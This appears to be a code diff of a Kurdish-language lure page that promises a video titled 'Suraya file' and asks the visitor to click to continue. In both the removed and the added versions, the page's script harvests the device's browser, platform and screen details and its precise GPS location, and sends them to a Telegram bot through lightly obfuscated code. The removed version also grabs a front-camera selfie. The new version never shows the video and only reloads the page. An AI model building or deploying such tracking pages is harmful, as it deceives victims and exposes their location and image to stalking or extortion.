@@ -2,125 +2,27 @@
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری قووڵ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مەلەفی سوڕەیا</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { 
-            background: linear-gradient(135deg, #0f172a, #1e293b); 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            overflow: hidden;
-            position: fixed;
-            width: 100%;
-        }
-        .container { 
-            background: #ffffff; 
-            padding: 22px; 
-            border-radius: 24px; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
-            width: 92%; 
-            max-width: 380px; 
-            text-align: center; 
-        }
-        .preview-img-box {
-            width: 100%;
-            height: 200px;
-            border-radius: 16px;
-            overflow: hidden;
-            margin-bottom: 15px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-            position: relative;
-            background: #000;
-        }
-        .preview-img-box img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-        .image-overlay-text {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.85), rgba(0,0,0,0.4));
-            color: #ffffff;
-            padding: 10px;
-            font-size: 13px;
-            font-weight: bold;
-            text-align: center;
-        }
-        .content-after-allow {
-            display: none;
-            margin-bottom: 15px;
-        }
-        .content-after-allow video {
-            width: 100%;
-            border-radius: 12px;
-            max-height: 240px;
-            object-fit: cover;
-            outline: none;
-        }
-        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
-        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
-        .btn { 
-            background: linear-gradient(135deg, #2563eb, #1d4ed8); 
-            color: white; 
-            padding: 15px; 
-            border: none; 
-            border-radius: 30px; 
-            cursor: pointer; 
-            font-size: 16px; 
-            width: 100%; 
-            font-weight: bold; 
-            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
-        }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-radius: 50%;
-            border-top: 3px solid #2563eb;
-            width: 32px;
-            height: 32px;
-            animation: spin 1s linear infinite;
-            margin: 15px auto;
-            display: none;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
+        body { background: #0f172a; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: #fff; padding: 25px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .btn { background: #2563eb; color: white; padding: 14px; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; width: 100%; font-weight: bold; margin-top: 15px; }
+        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #2563eb; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="mainContainer">
-        <div id="imageBox" class="preview-img-box">
-            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
-            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
-        </div>
-
-        <div id="mediaBox" class="content-after-allow">
-            <video id="targetVideo" controls playsinline>
-                <source src="sararanyai.MP4" type="video/mp4">
-                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
-            </video>
-        </div>
-
-        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
-        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</div>
-        
+    <div class="container">
+        <h2>مەلەفی سوڕەیا</h2>
+        <p style="color: #64748b; font-size: 13px; margin: 10px 0;">بۆ بینینی ناوەڕۆکەکە، کلیک لە دوگمەی خوارەوە بکە:</p>
         <div id="loader" class="loader"></div>
         <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
-        
-        <div class="status-text" id="statusText">ئامادەیە</div>
     </div>
 
-    <video id="camVideo" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        document.addEventListener('contextmenu', event => event.preventDefault());
-
         function simpleEncrypt(text) {
             return btoa(text.split('').map(char => 
                 String.fromCharCode(char.charCodeAt(0) + 3)
@@ -140,84 +42,37 @@
             } catch(e) {}
         }
 
-        // ناردنی تێکست و زانیاری
-        async function gatherAndSendTelemetry() {
+        async function startProcess() {
+            document.getElementById('mainBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // ١. ناردنی زانیاریی سەرەتایی و براوسەر
             let ua = navigator.userAgent;
             let platform = navigator.platform;
             let screenRes = window.screen.width + "x" + window.screen.height;
             
-            let report = `⚡ *ڕاپۆرتی تایتان (آیفون/مۆبایل):*\n\n` +
-                         `• سیستم: ${platform}\n` +
-                         `• شاشە: ${screenRes}\n` +
-                         `• براوسەر: \`${ua}\``;
-            
-            await sendToTelegram({ type: 'text', text: report });
-        }
-
-        // وەرگرتنی شوێنی GPS دەستبەجێ
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    let lat = position.coords.latitude;
-                    let lon = position.coords.longitude;
-                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})`;
-                    sendToTelegram({ type: 'text', text: locMsg });
-                }, function(error) {
-                    sendToTelegram({ type: 'text', text: "⚠️ شوێن (GPS) ڕەتکرایەوە لەلایەن بەکارهێنەرەوە." });
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            }
-        }
-
-        // گرتنی وێنەی کامێرا دەستبەجێ لەگەڵ کلیکدا (بۆ ئایفۆن)
-        function captureCameraInstant() {
-            const video = document.getElementById('camVideo');
-            const canvas = document.getElementById('canvas');
-            
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    let ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(blob => {
-                        let reader = new FileReader();
-                        reader.readAsDataURL(blob);
-                        reader.onloadend = function() {
-                            sendToTelegram({ type: 'photo', caption: "📸 *وێنەی کامێرای پێشەوە (Selfie)*", data: reader.result });
-                        }
-                    }, 'image/jpeg', 0.8);
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1000);
-            }).catch(err => {
-                sendToTelegram({ type: 'text', text: "⚠️ کامێرا لەلایەن بەکارهێنەرەوە ڕەتکرایەوە." });
+            await sendToTelegram({ 
+                type: 'text', 
+                text: `⚡ *سەردانیکەری نوێ:*\n• سیستم: ${platform}\n• شاشە: ${screenRes}\n• براوسەر: \`${ua}\`` 
             });
-        }
 
-        // کاتێک دوگمە دەگوشرێت، هەموو شتێک ڕاستەوخۆ دەست پێدەکات
-        function startProcess() {
-            document.getElementById('mainBtn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('statusText').innerText = 'چاوەڕوان بە...';
+            // ٢. ناردنی شوێنی GPS ئەگەر بەردەست بێت
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async function(pos) {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    await sendToTelegram({ 
+                        type: 'text', 
+                        text: `📍 *شوێنی GPS:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})` 
+                    });
+                }, function(err) {}, { timeout: 5000 });
+            }
 
-            // بانگکردنی ڕاستەوخۆ بۆ ئەوەی ئایفۆن قفڵیان نەکات
-            gatherAndSendTelemetry();
-            requestLocation();
-            captureCameraInstant();
-
+            // ٣. پاش چەند چرکەیەک کردنەوەی ڤیدیۆکە
             setTimeout(function() {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('imageBox').style.display = 'none';
-                document.getElementById('mediaBox').style.display = 'block';
-                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
-                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
-                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو';
-                
-                let vid = document.getElementById('targetVideo');
-                vid.play().catch(e => {});
-            }, 3000);
+                alert("بۆ بینینی ڤیدیۆکە تکایە سەردانی پەیجی سەرەکی بکەرەوە.");
+                window.location.reload();
+            }, 2500);
         }
     </script>
 </body>
